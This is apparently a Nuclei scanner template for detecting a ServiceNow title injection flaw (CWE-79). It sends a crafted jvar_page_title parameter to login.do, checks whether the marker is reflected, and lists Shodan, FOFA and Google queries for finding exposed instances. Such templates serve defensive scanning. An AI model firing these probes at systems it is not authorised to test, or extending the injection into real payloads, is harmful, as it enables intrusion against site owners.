id: servicenow-title-injection
info:
  name: Service Now - Title Injection
  author: DhiyaneshDk
  severity: high
  reference:
    - https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data
  classification:
    cwe-id:
      - CWE-79
    cpe: cpe:2.3:a:servicenow:servicenow:*:*:*:*:*:*:*:*
  metadata:
    fofa-query:
      - icon_hash=1701804003
      - title="servicenow"
    google-query: intitle:"servicenow"
    max-request: 1
    product: servicenow
    shodan-query:
      - http.favicon.hash:1701804003
      - http.title:"servicenow"
    vendor: servicenow
    verified: true
  tags: cve,cve2024,injection,servicenow,vuln
http:
  - matchers:
      - part: body
        type: word
        words:
          - <title><style><foo>Injected Title</foo></style></title>
      - part: header
        type: word
        words:
          - text/html
      - status:
          - 200
        # digest: 490a004630440220653889c274245a8b17bef8dcb2f4da468d1c00a778566e5bbfa6ac637434cd2e02202f58f6f595584120961e7eeb6a64e9baf5e732cee812faee3337264d8a609fc4:922c64590222798bb761d5b6d8e72950

        type: status
    matchers-condition: and
    method: GET
    path:
      - '{{BaseURL}}/login.do?jvar_page_title=<style><foo>Injected Title</foo></style>'
